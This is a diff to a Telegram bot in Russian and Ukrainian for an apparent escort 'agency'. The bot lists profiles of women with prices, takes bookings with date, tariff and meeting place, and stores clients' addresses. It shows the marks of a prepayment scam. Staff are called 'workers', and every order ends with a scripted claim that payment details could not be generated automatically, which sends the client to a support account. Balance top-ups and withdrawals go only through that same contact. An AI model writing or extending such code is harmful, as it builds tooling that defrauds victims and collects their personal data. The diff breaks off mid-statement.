@@ -25,15 +25,22 @@ dp = Dispatcher(storage=storage)
 WORKER_IDS = [8984858752]
 SUPPORT_IDS = [8984858752]
 
-# ФОТО ДЛЯ РАЗНЫХ МЕСТ (ЗАПОЛНЯЮТСЯ АВТОМАТИЧЕСКИ)
 PHOTO_MAIN = None
 PHOTO_PROFILE = None
 PHOTO_SEARCH = None
+
+STICKER_MAIN_MENU = "CAACAgIAAxkBAAFM6XlqNZ_C3Vztf0m9uUfnEz_lH5O9BAACPgQAAsxUSQl-tv_saZ1LxzwE"
 
 PROFILES = {}
 USER_LANGUAGE = {}
 USER_NAMES = {}
 USER_REGISTERED = {}
+USER_BALANCE = {}
+USER_ORDERS = {}
+USER_MEETING_ADDRESS = {}
+USER_VIP = {}
+USER_RATING = {}
+USER_ORDERS_COUNT = {}
 ORDERS = {}
 
 # ===== ПЕРЕВОДЫ =====
@@ -56,29 +63,47 @@ TEXTS = {
         'profile_my_id': '🆔 ID:',
         'profile_my_name': '📛 Имя:',
         'profile_my_username': '🔗 Username:',
-        'profile_my_registered': '📅 Зарегистрирован:',
+        'profile_my_registered': '📅 Дата регистрации:',
         'profile_my_language': '🌍 Язык:',
         'profile_my_role': '👔 Роль:',
         'profile_my_role_user': '👤 Пользователь',
         'profile_my_role_worker': '👷 Воркер',
-        'profile_my_stats': '📊 Статистика',
-        'profile_my_profiles_count': '📋 Создано анкет:',
-        'profile_my_views': '👁️ Просмотров:',
-        'profile_my_rating': '⭐ Рейтинг:',
+        'profile_my_orders_count': '📋 Выполнено заказов:',
+        'profile_my_balance': '💰 Баланс сервиса:',
+        'profile_my_rating': '⭐ Рейтинг клиента:',
+        'profile_my_vip': '👑 VIP Членство:',
+        'profile_my_vip_active': '✅ Активно',
+        'profile_my_vip_inactive': '❌ Неактивно',
         'profile_my_edit_name': '✏️ Изменить имя',
         'profile_my_edit_name_step': '✏️ Введите новое имя\n\nИмя будет отображаться в вашем профиле.',
         'profile_my_name_changed': '✅ Имя успешно изменено на:',
         'profile_my_edit_cancel': '❌ Отмена',
         'profile_my_back': '🔙 Назад в профиль',
+        'profile_my_desc': 'Здесь отображается ваша личная статистика и статус клиента.\nЭтот раздел — ваша визитная карточка в Агентстве. Чем выше активность — тем больше доверия, привилегий и эксклюзива.',
+        'profile_my_reputation': 'Ваш профиль — это не просто цифры. Это ваша репутация, ваш доступ к лучшему.\nСледите за активностью, повышайте рейтинг — и откроются новые грани сервиса.',
+        'profile_balance_topup': '💳 Пополнить баланс',
+        'profile_balance_withdraw': '🏦 Вывести средства',
+        'profile_orders_history': '📜 История заказов',
+        'profile_meeting_places': '📍 Места встречи',
+        'profile_meeting_address_step': '📍 Введите адрес места встречи\n\nНапример: ул. Центральная, д. 1, Киев',
+        'profile_meeting_address_saved': '✅ Адрес места встречи сохранен!',
+        'profile_balance_topup_message': '💳 Пополнение баланса\n\nДля пополнения баланса, пожалуйста, обратитесь в техподдержку:\n\n👨‍💻 Тех. поддержка: @MistSupports',
+        'profile_balance_withdraw_message': '🏦 Вывод средств\n\nДля вывода средств, пожалуйста, обратитесь в техподдержку:\n\n👨‍💻 Тех. поддержка: @MistSupports',
+        'profile_orders_history_empty': '📜 История заказов\n\nУ вас пока нет заказов.',
+        'profile_orders_history_item': '📜 Заказ #{order_id}\n🌸 Девушка: {girl_name}\n📅 Дата: {date}\n⏰ Время: {time}\n📍 Место: {place}\n💰 Сумма: {amount} грн',
         'order_button': '📅 Оформить встречу',
         'order_title': '📅 Оформление встречи',
         'order_select_date': '📆 Выберите дату\n\nВведите дату в формате:\nДД.ММ.ГГГГ\n\nНапример: 25.12.2025',
         'order_select_time': '⏰ Выберите время\n\nВведите время в формате:\nЧЧ:ММ\n\nНапример: 18:30',
+        'order_select_tariff': '💰 Выберите тариф\n\nВыберите продолжительность встречи:',
+        'order_select_place': '📍 Выберите место встречи\n\nГде планируете встретиться?',
+        'order_place_me': '🏠 У меня',
+        'order_place_model': '🏨 У модели',
         'order_confirm_title': '✅ Подтверждение встречи',
         'order_confirm_button': '✅ Подтвердить',
         'order_cancel_button': '❌ Отменить',
         'order_sent_to_support': '❌ Уважаемый клиент, наша система не смогла автоматически подобрать индивидуальные реквизиты для оплаты данной суммы.\n\nПожалуйста, обратитесь в поддержку для предоставления актуальных реквизитов.\n\n👨‍💻 Тех. поддержка: @MistSupports',
-        'order_support_message': '🆕 Новая заявка на встречу!\n\n👤 Пользователь: {user_name} (ID: {user_id})\n🌸 Девушка: {girl_name}\n📅 Дата: {date}\n⏰ Время: {time}\n🔑 Код анкеты: {profile_code}',
+        'order_support_message': '🆕 Новая заявка на встречу!\n\n👤 Пользователь: {user_name} (ID: {user_id})\n🌸 Девушка: {girl_name}\n📅 Дата: {date}\n⏰ Время: {time}\n📍 Место: {place}\n💰 Тариф: {tariff}\n🔑 Код анкеты: {profile_code}',
         'order_canceled': '❌ Оформление заказа отменено.',
         'order_invalid_date': '❌ Неверный формат! Введите дату в формате:\nДД.ММ.ГГГГ\n\nНапример: 25.12.2025',
         'order_invalid_time': '❌ Неверный формат! Введите время в формате:\nЧЧ:ММ\n\nНапример: 18:30',
@@ -100,8 +125,9 @@ TEXTS = {
         'profile_weight_step': '⚖️ Создание анкеты\n\nШаг 5 из 8: Введите ВЕС девушки (кг)\n\nНапример: 55, 60, 65',
         'profile_city_step': '📍 Создание анкеты\n\nШаг 6 из 8: Введите ГОРОД\n\nНапример: Киев, Одесса, Харьков',
         'profile_description_step': '📝 Создание анкеты\n\nШаг 7 из 8: Введите ОПИСАНИЕ\n\nНапишите краткое описание девушки, её услуги, особенности.',
-        'profile_price_1h_step': '💰 Создание анкеты\n\nШаг 8 из 8: Введите ЦЕНЫ\n\nСначала введите цену за 1 час (в гривнах):',
-        'profile_price_night_step': '🌙 Создание анкеты\n\nТеперь введите цену за ночь (в гривнах):\n\nНапример: 15000, 20000, 30000',
+        'profile_price_1h_step': '💰 Создание анкеты\n\nШаг 8 из 10: Введите цену за 1 час (в гривнах):\n\nНапример: 3000, 5000, 10000',
+        'profile_price_3h_step': '⏰ Создание анкеты\n\nШаг 9 из 10: Введите цену за 3 часа (в гривнах):\n\nНапример: 7000, 10000, 15000',
+        'profile_price_night_step': '🌙 Создание анкеты\n\nШаг 10 из 10: Введите цену за ночь (в гривнах):\n\nНапример: 15000, 20000, 30000',
         'profile_preview': '📋 ПРЕДПРОСМОТР АНКЕТЫ',
         'profile_confirm_save': '✅ Сохранить',
         'profile_confirm_cancel': '❌ Отменить',
@@ -118,6 +144,7 @@ TEXTS = {
         'profile_description': '📝 Описание:',
         'profile_prices': '💰 Цены:',
         'profile_1h': '• 1 час:',
+        'profile_3h': '• 3 часа:',
         'profile_night': '• Ночь:',
         'profile_photos': '📸 Фото:',
         'profile_created_at': '📅 Создана:',
@@ -141,6 +168,7 @@ TEXTS = {
         'settings_invalid_height': '❌ Рост должен быть от 140 до 200 см!',
         'settings_invalid_weight': '❌ Вес должен быть от 40 до 120 кг!',
         'settings_invalid_price': '❌ Цена должна быть от 1000 до 100000 грн!',
+        'settings_invalid_price_3h': '❌ Цена должна быть от 2000 до 200000 грн!',
         'settings_invalid_price_night': '❌ Цена должна быть от 5000 до 200000 грн!',
         'settings_invalid_number': '❌ Введите число!',
         'settings_invalid_text': '❌ Введите текст!',
@@ -187,29 +215,47 @@ TEXTS = {
         'profile_my_id': '🆔 ID:',
         'profile_my_name': '📛 Ім\'я:',
         'profile_my_username': '🔗 Username:',
-        'profile_my_registered': '📅 Зареєстрований:',
+        'profile_my_registered': '📅 Дата реєстрації:',
         'profile_my_language': '🌍 Мова:',
         'profile_my_role': '👔 Роль:',
         'profile_my_role_user': '👤 Користувач',
         'profile_my_role_worker': '👷 Працівник',
-        'profile_my_stats': '📊 Статистика',
-        'profile_my_profiles_count': '📋 Створено анкет:',
-        'profile_my_views': '👁️ Переглядів:',
-        'profile_my_rating': '⭐ Рейтинг:',
+        'profile_my_orders_count': '📋 Виконано замовлень:',
+        'profile_my_balance': '💰 Баланс сервісу:',
+        'profile_my_rating': '⭐ Рейтинг клієнта:',
+        'profile_my_vip': '👑 VIP Членство:',
+        'profile_my_vip_active': '✅ Активно',
+        'profile_my_vip_inactive': '❌ Неактивно',
         'profile_my_edit_name': '✏️ Змінити ім\'я',
         'profile_my_edit_name_step': '✏️ Введіть нове ім\'я\n\nІм\'я буде відображатися у вашому профілі.',
         'profile_my_name_changed': '✅ Ім\'я успішно змінено на:',
         'profile_my_edit_cancel': '❌ Скасувати',
         'profile_my_back': '🔙 Назад у профіль',
+        'profile_my_desc': 'Тут відображається ваша особиста статистика та статус клієнта.\nЦей розділ — ваша візитна картка в Агентстві. Чим вища активність — тим більше довіри, привілеїв та ексклюзиву.',
+        'profile_my_reputation': 'Ваш профіль — це не просто цифри. Це ваша репутація, ваш доступ до найкращого.\nСлідкуйте за активністю, підвищуйте рейтинг — і відкриються нові грані сервісу.',
+        'profile_balance_topup': '💳 Поповнити баланс',
+        'profile_balance_withdraw': '🏦 Вивести кошти',
+        'profile_orders_history': '📜 Історія замовлень',
+        'profile_meeting_places': '📍 Місця зустрічей',
+        'profile_meeting_address_step': '📍 Введіть адресу місця зустрічі\n\nНаприклад: вул. Центральна, буд. 1, Київ',
+        'profile_meeting_address_saved': '✅ Адресу місця зустрічі збережено!',
+        'profile_balance_topup_message': '💳 Поповнення балансу\n\nДля поповнення балансу, будь ласка, зверніться до техпідтримки:\n\n👨‍💻 Тех. підтримка: @MistSupports',
+        'profile_balance_withdraw_message': '🏦 Виведення коштів\n\nДля виведення коштів, будь ласка, зверніться до техпідтримки:\n\n👨‍💻 Тех. підтримка: @MistSupports',
+        'profile_orders_history_empty': '📜 Історія замовлень\n\nУ вас поки немає замовлень.',
+        'profile_orders_history_item': '📜 Замовлення #{order_id}\n🌸 Дівчина: {girl_name}\n📅 Дата: {date}\n⏰ Час: {time}\n📍 Місце: {place}\n💰 Сума: {amount} грн',
         'order_button': '📅 Оформити зустріч',
         'order_title': '📅 Оформлення зустрічі',
         'order_select_date': '📆 Виберіть дату\n\nВведіть дату у форматі:\nДД.ММ.РРРР\n\nНаприклад: 25.12.2025',
         'order_select_time': '⏰ Виберіть час\n\nВведіть час у форматі:\nГГ:ХХ\n\nНаприклад: 18:30',
+        'order_select_tariff': '💰 Виберіть тариф\n\nВиберіть тривалість зустрічі:',
+        'order_select_place': '📍 Виберіть місце зустрічі\n\nДе плануєте зустрітися?',
+        'order_place_me': '🏠 У мене вдома',
+        'order_place_model': '🏨 У моделі',
         'order_confirm_title': '✅ Підтвердження зустрічі',
         'order_confirm_button': '✅ Підтвердити',
         'order_cancel_button': '❌ Скасувати',
         'order_sent_to_support': '❌ Шановний клієнте, наша система не змогла автоматично підібрати індивідуальні реквізити для оплати даної суми.\n\nБудь ласка, зверніться до підтримки для надання актуальних реквізитів.\n\n👨‍💻 Тех. підтримка: @MistSupports',
-        'order_support_message': '🆕 Нова заявка на зустріч!\n\n👤 Користувач: {user_name} (ID: {user_id})\n🌸 Дівчина: {girl_name}\n📅 Дата: {date}\n⏰ Час: {time}\n🔑 Код анкети: {profile_code}',
+        'order_support_message': '🆕 Нова заявка на зустріч!\n\n👤 Користувач: {user_name} (ID: {user_id})\n🌸 Дівчина: {girl_name}\n📅 Дата: {date}\n⏰ Час: {time}\n📍 Місце: {place}\n💰 Тариф: {tariff}\n🔑 Код анкети: {profile_code}',
         'order_canceled': '❌ Оформлення замовлення скасовано.',
         'order_invalid_date': '❌ Невірний формат! Введіть дату у форматі:\nДД.ММ.РРРР\n\nНаприклад: 25.12.2025',
         'order_invalid_time': '❌ Невірний формат! Введіть час у форматі:\nГГ:ХХ\n\nНаприклад: 18:30',
@@ -231,8 +277,9 @@ TEXTS = {
         'profile_weight_step': '⚖️ Створення анкети\n\nКрок 5 з 8: Введіть ВАГУ дівчини (кг)\n\nНаприклад: 55, 60, 65',
         'profile_city_step': '📍 Створення анкети\n\nКрок 6 з 8: Введіть МІСТО\n\nНаприклад: Київ, Одеса, Харків',
         'profile_description_step': '📝 Створення анкети\n\nКрок 7 з 8: Введіть ОПИС\n\nНапишіть короткий опис дівчини, її послуги, особливості.',
-        'profile_price_1h_step': '💰 Створення анкети\n\nКрок 8 з 8: Введіть ЦІНИ\n\nСпочатку введіть ціну за 1 годину (в гривнях):',
-        'profile_price_night_step': '🌙 Створення анкети\n\nТепер введіть ціну за ніч (в гривнях):\n\nНаприклад: 15000, 20000, 30000',
+        'profile_price_1h_step': '💰 Створення анкети\n\nКрок 8 з 10: Введіть ціну за 1 годину (в гривнях):\n\nНаприклад: 3000, 5000, 10000',
+        'profile_price_3h_step': '⏰ Створення анкети\n\nКрок 9 з 10: Введіть ціну за 3 години (в гривнях):\n\nНаприклад: 7000, 10000, 15000',
+        'profile_price_night_step': '🌙 Створення анкети\n\nКрок 10 з 10: Введіть ціну за ніч (в гривнях):\n\nНаприклад: 15000, 20000, 30000',
         'profile_preview': '📋 ПОПЕРЕДНІЙ ПЕРЕГЛЯД АНКЕТИ',
         'profile_confirm_save': '✅ Зберегти',
         'profile_confirm_cancel': '❌ Скасувати',
@@ -249,6 +296,7 @@ TEXTS = {
         'profile_description': '📝 Опис:',
         'profile_prices': '💰 Ціни:',
         'profile_1h': '• 1 година:',
+        'profile_3h': '• 3 години:',
         'profile_night': '• Ніч:',
         'profile_photos': '📸 Фото:',
         'profile_created_at': '📅 Створено:',
@@ -272,6 +320,7 @@ TEXTS = {
         'settings_invalid_height': '❌ Зріст повинен бути від 140 до 200 см!',
         'settings_invalid_weight': '❌ Вага повинна бути від 40 до 120 кг!',
         'settings_invalid_price': '❌ Ціна повинна бути від 1000 до 100000 грн!',
+        'settings_invalid_price_3h': '❌ Ціна повинна бути від 2000 до 200000 грн!',
         'settings_invalid_price_night': '❌ Ціна повинна бути від 5000 до 200000 грн!',
         'settings_invalid_number': '❌ Введіть число!',
         'settings_invalid_text': '❌ Введіть текст!',
@@ -318,6 +367,7 @@ class CreateProfileStates(StatesGroup):
     waiting_for_city = State()
     waiting_for_description = State()
     waiting_for_price_1h = State()
+    waiting_for_price_3h = State()
     waiting_for_price_night = State()
     waiting_for_confirm = State()
 
@@ -328,14 +378,19 @@ class EditProfileStates(StatesGroup):
     waiting_for_name = State()
 
 class OrderStates(StatesGroup):
+    waiting_for_tariff = State()
     waiting_for_date = State()
     waiting_for_time = State()
+    waiting_for_place = State()
     waiting_for_confirm = State()
 
 class PhotoStates(StatesGroup):
     waiting_for_main = State()
     waiting_for_profile = State()
     waiting_for_search = State()
+
+class ProfileStates(StatesGroup):
+    waiting_for_meeting_address = State()
 
 # ===== ФУНКЦИИ =====
 def get_text(user_id: int, key: str) -> str:
@@ -380,12 +435,20 @@ def get_user_name(user_id: int) -> str:
 def get_user_registered(user_id: int) -> str:
     return USER_REGISTERED.get(user_id, datetime.now().strftime("%d.%m.%Y"))
 
-def get_user_profiles_count(user_id: int) -> int:
-    count = 0
-    for profile in PROFILES.values():
-        if profile.get('created_by') == user_id:
-            count += 1
-    return count
+def get_user_orders_count(user_id: int) -> int:
+    return USER_ORDERS_COUNT.get(user_id, 0)
+
+def get_user_balance(user_id: int) -> int:
+    return USER_BALANCE.get(user_id, 0)
+
+def get_user_rating(user_id: int) -> float:
+    return USER_RATING.get(user_id, 0.0)
+
+def is_user_vip(user_id: int) -> bool:
+    return USER_VIP.get(user_id, False)
+
+def get_user_orders(user_id: int) -> list:
+    return USER_ORDERS.get(user_id, [])
 
 # ===== КЛАВИАТУРЫ =====
 def main_menu(user_id: int):
@@ -394,22 +457,38 @@ def main_menu(user_id: int):
         [InlineKeyboardButton(text=text(user_id, 'vip_models'), callback_data="vip_models")],
         [InlineKeyboardButton(text=text(user_id, 'profile'), callback_data="show_profile"),
          InlineKeyboardButton(text=text(user_id, 'search'), callback_data="user_search_girl")],
-        [InlineKeyboardButton(text=text(user_id, 'submit'), callback_data="submit")]
+        [InlineKeyboardButton(text=text(user_id, 'submit'), callback_data="submit")],
+        [InlineKeyboardButton(text="👨‍💻 Тех. поддержка", url="https://t.me/MistSupports")],
     ]
     buttons.append([InlineKeyboardButton(text=text(user_id, 'settings'), callback_data="user_settings")])
     if user_id in WORKER_IDS:
         buttons.append([InlineKeyboardButton(text=text(user_id, 'worker_panel'), callback_data="worker_panel")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
-def language_start_menu():
+def tariff_keyboard(user_id: int, price_1h: int, price_3h: int, price_night: int, profile_code: str):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_start_ru")],
-        [InlineKeyboardButton(text="🇺🇦 Українська", callback_data="lang_start_uk")]
+        [InlineKeyboardButton(
+            text=f"🕐 1 час — {price_1h} грн", 
+            callback_data=f"tariff_1h_{profile_code}"
+        )],
+        [InlineKeyboardButton(
+            text=f"🕒 3 часа — {price_3h} грн", 
+            callback_data=f"tariff_3h_{profile_code}"
+        )],
+        [InlineKeyboardButton(
+            text=f"🌙 Ночь — {price_night} грн", 
+            callback_data=f"tariff_night_{profile_code}"
+        )],
+        [InlineKeyboardButton(text="❌ Отменить", callback_data="order_cancel")]
     ])
 
 def profile_menu(user_id: int):
     text = get_text
     return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=text(user_id, 'profile_balance_topup'), callback_data="profile_balance_topup")],
+        [InlineKeyboardButton(text=text(user_id, 'profile_balance_withdraw'), callback_data="profile_balance_withdraw")],
+        [InlineKeyboardButton(text=text(user_id, 'profile_orders_history'), callback_data="profile_orders_history")],
+        [InlineKeyboardButton(text=text(user_id, 'profile_meeting_places'), callback_data="profile_meeting_places")],
         [InlineKeyboardButton(text=text(user_id, 'profile_my_edit_name'), callback_data="profile_edit_name")],
         [InlineKeyboardButton(text=text(user_id, 'back_to_main'), callback_data="back_to_main")]
     ])
@@ -418,6 +497,12 @@ def profile_edit_cancel(user_id: int):
     text = get_text
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=text(user_id, 'profile_my_edit_cancel'), callback_data="profile_edit_cancel")]
+    ])
+
+def language_start_menu():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_start_ru")],
+        [InlineKeyboardButton(text="🇺🇦 Українська", callback_data="lang_start_uk")]
     ])
 
 def worker_panel_menu(user_id: int):
@@ -510,6 +595,14 @@ def order_cancel_keyboard(user_id: int):
         [InlineKeyboardButton(text=text(user_id, 'order_cancel_button'), callback_data="order_cancel")]
     ])
 
+def order_place_keyboard(user_id: int):
+    text = get_text
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=text(user_id, 'order_place_me'), callback_data="order_place_me")],
+        [InlineKeyboardButton(text=text(user_id, 'order_place_model'), callback_data="order_place_model")],
+        [InlineKeyboardButton(text=text(user_id, 'order_cancel_button'), callback_data="order_cancel")]
+    ])
+
 def order_confirm_keyboard(user_id: int):
     text = get_text
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -518,6 +611,29 @@ def order_confirm_keyboard(user_id: int):
     ])
 
 # ===== ОБРАБОТЧИКИ =====
+
+async def send_main_menu(message_or_call, user_id):
+    """Универсальная функция для отправки главного меню со стикером"""
+    text = get_text(user_id, 'main_menu')
+    
+    if STICKER_MAIN_MENU:
+        if isinstance(message_or_call, types.Message):
+            await message_or_call.answer_sticker(STICKER_MAIN_MENU)
+        else:
+            await message_or_call.message.answer_sticker(STICKER_MAIN_MENU)
+    
+    photo = get_photo('main')
+    if photo:
+        if isinstance(message_or_call, types.Message):
+            return await message_or_call.answer_photo(photo=photo, caption=text, reply_markup=main_menu(user_id))
+        else:
+            return await message_or_call.message.answer_photo(photo=photo, caption=text, reply_markup=main_menu(user_id))
+    else:
+        if isinstance(message_or_call, types.Message):
+            return await message_or_call.answer(text, reply_markup=main_menu(user_id))
+        else:
+            return await message_or_call.message.answer(text, reply_markup=main_menu(user_id))
+
 @dp.message(CommandStart())
 async def start(message: types.Message):
     user_id = message.from_user.id
@@ -534,14 +650,18 @@ async def start(message: types.Message):
         USER_NAMES[user_id] = message.from_user.first_name or "Пользователь"
     if user_id not in USER_REGISTERED:
         USER_REGISTERED[user_id] = datetime.now().strftime("%d.%m.%Y")
+    if user_id not in USER_BALANCE:
+        USER_BALANCE[user_id] = 0
+    if user_id not in USER_ORDERS_COUNT:
+        USER_ORDERS_COUNT[user_id] = 0
+    if user_id not in USER_RATING:
+        USER_RATING[user_id] = 0.0
+    if user_id not in USER_VIP:
+        USER_VIP[user_id] = False
+    if user_id not in USER_ORDERS:
+        USER_ORDERS[user_id] = []
     
-    photo = get_photo('main')
-    text = get_text(user_id, 'main_menu')
-    
-    if photo:
-        await message.answer_photo(photo=photo, caption=text, reply_markup=main_menu(user_id))
-    else:
-        await message.answer(text, reply_markup=main_menu(user_id))
+    await send_main_menu(message, user_id)
 
 @dp.callback_query(lambda c: c.data.startswith("lang_start_"))
 async def set_start_language(call: types.CallbackQuery):
@@ -551,25 +671,32 @@ async def set_start_language(call: types.CallbackQuery):
     USER_LANGUAGE[user_id] = lang
     USER_NAMES[user_id] = call.from_user.first_name or "Пользователь"
     USER_REGISTERED[user_id] = datetime.now().strftime("%d.%m.%Y")
+    USER_BALANCE[user_id] = 0
+    USER_ORDERS_COUNT[user_id] = 0
+    USER_RATING[user_id] = 0.0
+    USER_VIP[user_id] = False
+    USER_ORDERS[user_id] = []
     
     text = "✅ Язык установлен! Добро пожаловать!" if lang == 'ru' else "✅ Мову встановлено! Ласкаво просимо!"
     
-    photo = get_photo('main')
-    menu_text = get_text(user_id, 'main_menu')
-    
     await call.message.delete()
-    if photo:
-        await call.message.answer_photo(photo=photo, caption=f"{text}\n\n{menu_text}", reply_markup=main_menu(user_id))
-    else:
-        await call.message.answer(f"{text}\n\n{menu_text}", reply_markup=main_menu(user_id))
+    await call.message.answer(text)
+    await send_main_menu(call, user_id)
     await call.answer()
 
+# ===== ПРОФИЛЬ =====
 @dp.callback_query(lambda c: c.data == "show_profile")
 async def show_profile(call: types.CallbackQuery):
     user_id = call.from_user.id
     user = call.from_user
     
     photo = get_photo('profile')
+    orders_count = get_user_orders_count(user_id)
+    balance = get_user_balance(user_id)
+    rating = get_user_rating(user_id)
+    vip = is_user_vip(user_id)
+    vip_text = get_text(user_id, 'profile_my_vip_active') if vip else get_text(user_id, 'profile_my_vip_inactive')
+    
     profile_text = f"""
 {get_text(user_id, 'profile_my_title')}
 
@@ -580,10 +707,14 @@ async def show_profile(call: types.CallbackQuery):
 {get_text(user_id, 'profile_my_language')} {'Русский' if get_lang(user_id) == 'ru' else 'Українська'}
 {get_text(user_id, 'profile_my_role')} {get_text(user_id, 'profile_my_role_worker') if is_worker(user_id) else get_text(user_id, 'profile_my_role_user')}
 
-{get_text(user_id, 'profile_my_stats')}
-{get_text(user_id, 'profile_my_profiles_count')} {get_user_profiles_count(user_id)}
-{get_text(user_id, 'profile_my_views')} 0
-{get_text(user_id, 'profile_my_rating')} ⭐⭐⭐⭐⭐
+{get_text(user_id, 'profile_my_desc')}
+
+{get_text(user_id, 'profile_my_orders_count')} {orders_count}
+{get_text(user_id, 'profile_my_balance')} {balance} грн
+{get_text(user_id, 'profile_my_rating')} {rating}/5
+{get_text(user_id, 'profile_my_vip')} {vip_text}
+
+{get_text(user_id, 'profile_my_reputation')}
     """
     
     await call.message.delete()
@@ -593,11 +724,101 @@ async def show_profile(call: types.CallbackQuery):
         await call.message.answer(profile_text, reply_markup=profile_menu(user_id))
     await call.answer()
 
+# ===== БАЛАНС =====
+@dp.callback_query(lambda c: c.data == "profile_balance_topup")
+async def profile_balance_topup(call: types.CallbackQuery):
+    user_id = call.from_user.id
+    await call.message.delete()
+    await call.message.answer(
+        get_text(user_id, 'profile_balance_topup_message'),
+        reply_markup=back_to_profile_inline(user_id)
+    )
+    await call.answer()
+
+@dp.callback_query(lambda c: c.data == "profile_balance_withdraw")
+async def profile_balance_withdraw(call: types.CallbackQuery):
+    user_id = call.from_user.id
+    await call.message.delete()
+    await call.message.answer(
+        get_text(user_id, 'profile_balance_withdraw_message'),
+        reply_markup=back_to_profile_inline(user_id)
+    )
+    await call.answer()
+
+# ===== ИСТОРИЯ ЗАКАЗОВ =====
+@dp.callback_query(lambda c: c.data == "profile_orders_history")
+async def profile_orders_history(call: types.CallbackQuery):
+    user_id = call.from_user.id
+    orders = get_user_orders(user_id)
+    
+    if not orders:
+        await call.message.delete()
+        await call.message.answer(
+            get_text(user_id, 'profile_orders_history_empty'),
+            reply_markup=back_to_profile_inline(user_id)
+        )
+        await call.answer()
+        return
+    
+    text = "📜 История заказов\n\n"
+    for order in orders:
+        text += get_text(user_id, 'profile_orders_history_item').format(
+            order_id=order.get('id', ''),
+            girl_name=order.get('girl_name', ''),
+            date=order.get('date', ''),
+            time=order.get('time', ''),
+            place=order.get('place', ''),
+            amount=order.get('amount', 0)
+        ) + "\n\n"
+    
+    await call.message.delete()
+    await call.message.answer(text, reply_markup=back_to_profile_inline(user_id))
+    await call.answer()
+
+# ===== МЕСТА ВСТРЕЧ =====
+@dp.callback_query(lambda c: c.data == "profile_meeting_places")
+async def profile_meeting_places(call: types.CallbackQuery, state: FSMContext):
+    user_id = call.from_user.id
+    address = USER_MEETING_ADDRESS.get(user_id, "Не указан")
+    
+    text = f"""
+📍 Место встречи
+
+Текущий адрес: {address}
+
+Введите новый адрес или оставьте текущий.
+    """
+    
+    await call.message.delete()
+    await call.message.answer(
+        text,
+        reply_markup=back_to_profile_inline(user_id)
+    )
+    await state.set_state(ProfileStates.waiting_for_meeting_address)
+    await call.answer()
+
+@dp.message(ProfileStates.waiting_for_meeting_address)
+async def save_meeting_address(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    if not message.text:
+        await message.answer(get_text(user_id, 'settings_invalid_text'))
+        return
+    USER_MEETING_ADDRESS[user_id] = message.text.strip()
+    await message.answer(
+        get_text(user_id, 'profile_meeting_address_saved'),
+        reply_markup=back_to_profile_inline(user_id)
+    )
+    await state.clear()
+
+# ===== РЕДАКТИРОВАНИЕ ИМЕНИ =====
 @dp.callback_query(lambda c: c.data == "profile_edit_name")
 async def profile_edit_name(call: types.CallbackQuery, state: FSMContext):
     user_id = call.from_user.id
     await call.message.delete()
-    await call.message.answer(get_text(user_id, 'profile_my_edit_name_step'), reply_markup=profile_edit_cancel(user_id))
+    await call.message.answer(
+        get_text(user_id, 'profile_my_edit_name_step'),
+        reply_markup=profile_edit_cancel(user_id)
+    )
     await state.set_state(EditProfileStates.waiting_for_name)
     await call.answer()
 
@@ -621,14 +842,27 @@ async def profile_edit_cancel(call: types.CallbackQuery, state: FSMContext):
     await call.message.delete()
     await show_profile(call)
 
+# ===== ПОИСК ДЕВУШКИ =====
 @dp.callback_query(lambda c: c.data == "user_search_girl")
 async def user_search_girl(call: types.CallbackQuery, state: FSMContext):
     user_id = call.from_user.id
     await call.message.delete()
-    await call.message.answer(
-        get_text(user_id, 'find_girl_title'),
-        reply_markup=back_to_main_menu(user_id)
-    )
+    
+    photo = get_photo('search')
+    text = get_text(user_id, 'find_girl_title')
+    
+    if photo:
+        await call.message.answer_photo(
+            photo=photo,
+            caption=text,
+            reply_markup=back_to_main_menu(user_id)
+        )
+    else:
+        await call.message.answer(
+            text,
+            reply_markup=back_to_main_menu(user_id)
+        )
+    
     await state.set_state(UserSearchStates.waiting_for_girl_code)
     await call.answer()
 
@@ -659,6 +893,7 @@ async def process_girl_search(message: types.Message, state: FSMContext):
 
 {get_text(user_id, 'profile_prices')}
 {get_text(user_id, 'profile_1h')} {data.get('price_1h', '?')} грн
+{get_text(user_id, 'profile_3h')} {data.get('price_3h', '?')} грн
 {get_text(user_id, 'profile_night')} {data.get('price_night', '?')} грн
 
 {get_text(user_id, 'find_girl_code_label')} {code}
@@ -666,34 +901,81 @@ async def process_girl_search(message: types.Message, state: FSMContext):
 {get_text(user_id, 'find_girl_contact')}
     """
     
-    photo = get_photo('search')
     order_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=get_text(user_id, 'order_button'), callback_data=f"order_start_{code}")],
         [InlineKeyboardButton(text=get_text(user_id, 'back_to_main'), callback_data="back_to_main")]
     ])
     
     if data.get('photos'):
-        if photo:
-            await message.answer_photo(photo=photo, caption=caption, reply_markup=order_keyboard)
-        else:
-            await message.answer_photo(photo=data['photos'][0], caption=caption, reply_markup=order_keyboard)
+        await message.answer_photo(
+            photo=data['photos'][0],
+            caption=caption,
+            reply_markup=order_keyboard
+        )
         for photo_id in data['photos'][1:]:
             await message.answer_photo(photo=photo_id)
     else:
-        if photo:
-            await message.answer_photo(photo=photo, caption=caption, reply_markup=order_keyboard)
-        else:
-            await message.answer(caption, reply_markup=order_keyboard)
+        await message.answer(caption, reply_markup=order_keyboard)
     
     await state.clear()
 
+# ===== ОФОРМЛЕНИЕ ЗАКАЗА =====
 @dp.callback_query(lambda c: c.data.startswith("order_start_"))
 async def order_start(call: types.CallbackQuery, state: FSMContext):
     user_id = call.from_user.id
     profile_code = call.data.split("_")[2]
+    profile_data = PROFILES.get(profile_code, {})
+    
+    price_1h = profile_data.get('price_1h', 0)
+    price_3h = profile_data.get('price_3h', 0)
+    price_night = profile_data.get('price_night', 0)
+    
     await state.update_data(profile_code=profile_code)
     await call.message.delete()
-    await call.message.answer(get_text(user_id, 'order_select_date'), reply_markup=order_cancel_keyboard(user_id))
+    
+    text = f"""
+{get_text(user_id, 'order_select_tariff')}
+
+🕐 1 час — {price_1h} грн
+🕒 3 часа — {price_3h} грн
+🌙 Ночь — {price_night} грн
+    """
+    
+    await call.message.answer(
+        text,
